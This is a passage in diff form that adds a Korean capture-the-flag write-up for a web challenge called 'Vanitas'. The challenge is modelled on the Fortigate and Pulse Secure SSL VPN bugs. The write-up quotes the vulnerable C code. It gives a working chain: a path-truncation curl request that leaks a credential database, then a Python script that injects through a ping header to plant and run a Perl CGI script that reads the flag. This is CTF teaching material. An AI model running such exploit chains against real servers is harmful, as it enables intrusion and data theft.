@@ -1,0 +1,75 @@
+n1net4il — 오늘 오후 10:00
+[web 1 - Vanitas Writeup]
+
+제 능력 부족 + 시간 부족으로 정말 딱 문제에 필요한 기능만 구현되었지만 다음 두 취약점을 오마주한 것이었습니다.
+CVE-2018-13379: https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html
+CVE-2019-11539: https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html
+
+풀이에 앞서 미숙한 구현 상태에 죄송하다는 말씀을 드립니다.
+풀이자분들께는 바이너리만 제공되어있지만 해당 풀이에서는 읽어주시는 분들의 편의를 위헤 소스코드를 인용합니다.
+
+locale에 맞는 html 파일을 가져올 때 snprintf를 사용하여 글자 수를 잘 맞추면 뒤의 .html을 truncate시키는 것이 가능. 이를 이용해 .db를 leak하여 아이디 및 비밀번호를 획득. (Ref. CVE-2018-13379)
+char *locale = strdup(request->path + 1);
+locale[strlen(request->path) - 5] = '\0';
+snprintf(filepath, 0x100, "html/auth/%s.html", locale);
+
+$ curl http://52.78.31.14/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////../../.db/auth --path-as-is --output .db
+$ sqlite3 .db
+SQLite version 3.37.2 2022-01-06 13:25:41
+Enter ".help" for usage hints.
+sqlite> select * from users;
+vanitas_vanitatum_791e45a8|et_omnia_vanitas_8ec1ac9e
+
+
+diagnosis 쪽에서 command injection이 있지만 filter로 인해 직접적인 RCE가 어려운 상황
+char command[0x100];
+
+host = get_http_request_header(request, "X-Target");
+check_command(fd, host);
+snprintf(command, 0x100, "ping %s", host);
+
+
+간단한 python/perl cgi 기능이 존재함
+if (endswith(cgi_path, ".py")) {
+    snprintf(command, 0x100, "/usr/bin/python3 %s", cgi_path);
+} else if (endswith(cgi_path, ".pl")) {
+    snprintf(command, 0x100, "/usr/bin/perl %s", cgi_path);
+} else {
+    send_http_response_404(fd);
+    exit(EXIT_SUCCESS);
+}
+
+
+python에서는 불가능하지만 perl에서는 ":" 문자가 goto label로 인식된다는 점을 이용하면 이러한 것이 가능함. (Ref. CVE-2019-11539)
+
+ubuntu@ip-10-0-13-168:~$ ping "print 123#" 2>&1
+ping: print 123#: Name or service not known
+
+ubuntu@ip-10-0-13-168:~$ ping "print 123#" 2>&1 | perl
+123
+
+
+command injection filter에 ">" 문자는 막혀있지 않기 때문에 이를 이용해 cgi-bin에 펄 스크립트를 작성 후 실행
+import requests
+
+TARGET = 'http://52.78.31.14'
+
+response = requests.get(TARGET + '/en/diagnosis', headers = {
+    'Cookie' : 'auth=vanitas_vanitatum_791e45a8|et_omnia_vanitas_8ec1ac9e',
+    'X-Target' : '\\$x=\\"cat\\\\t/flag_645b0ab1d0f09363d9cf86ea7dd85a34\\",system\\$x# 2> cgi-bin/asdfasdjklfjklas.pl',
+})
+print(response.status_code)
+
+response = requests.get(TARGET + '/cgi-bin/asdfasdjklfjklas.pl')
+print(response.text)
+
+
+Orange
+Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN
+https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html
+This is 🍊 speaking
+이미지
+Orange
+Attacking SSL VPN - Part 3: The Golden Pulse Secure SSL VPN RCE Cha...
+https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html
+This is 🍊 speaking
